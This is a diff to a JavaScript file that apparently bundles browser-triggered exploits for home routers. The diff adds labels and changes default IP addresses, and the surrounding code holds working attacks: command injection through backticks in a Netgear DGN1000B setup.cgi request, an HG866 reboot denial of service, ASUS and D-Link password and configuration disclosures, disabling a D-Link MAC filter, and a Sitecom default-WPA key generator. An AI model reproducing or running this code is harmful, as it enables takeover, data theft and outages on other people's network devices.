@@ -76,7 +76,7 @@ function binatone_dt850w_changeadmin(ip)
 
 }
 
-
+// Sitecom WLR-4000/4004 routers default WPA generator
 function sitecom400xwpa(keylength) {
     "use strict";
 
@@ -372,6 +372,7 @@ function hg866passr() {
 		
 	}
 
+// HG866 Denial of service
 	function hg866dosr() {
 		ip=prompt("IP:");
 		document.hg866dos.action="http://"+ip+"/html/admin_reboot.html";
@@ -380,6 +381,7 @@ function hg866passr() {
 		}
 	}
 
+// ASUS RT-N16 - Text-plain Admin Password Disclosure
 function rtn16_passdisclosure(ip)
 {
     ip = ip || "192.168.1.1";
@@ -514,6 +516,7 @@ function wndr3400_disclosure(ip)
 	document.location="http://"+ip+url;
 }
 
+// D-Link DSL-2740B - Disable Wireless MAC Filter
 function dsl2740b_disablemacfilter(ip)
 {
 	ip = ip || "192.168.1.1";
@@ -523,13 +526,15 @@ function dsl2740b_disablemacfilter(ip)
 	post('http://' + ip + '/wlmacflt.cmd', form);
 }
 
+// Netgear DGN1000B - Remote Command Execution
 function dgn1000b_commandexec(ip)
 {
-	ip = ip || "192.168.178.188";
+	ip = ip || "192.168.0.1";
 	cmd = prompt("Command:");
 	url = "/setup.cgi?UPnP=UPnP&AdverTime=30&TimeToLive=`%20" + encodeURI(cmd) + "%20`&save=+Anwenden&todo=save&this_file=upnp.htm&next_file=upnp.htm&h_UPnP=enable&hiddenAdverTime=30&hiddenTimeToLive=4";
 	document.location="http://"+ip+url;
 }
+
 // D-LINK DIR-280 - Change Admin Password
 function dir280_changepassword(ip)
 {
@@ -577,9 +582,10 @@ function td8840t_resetauth(ip)
     
 }
 
+// D-Link DSL-320B - Configuration Disclosure
 function dsl320b_configdisclosure(ip)
 {
-    ip = ip || "192.168.178.111";
+    ip = ip || "192.168.1.1";
     document.location="http://"+ip+"/config.bin";
 }
 
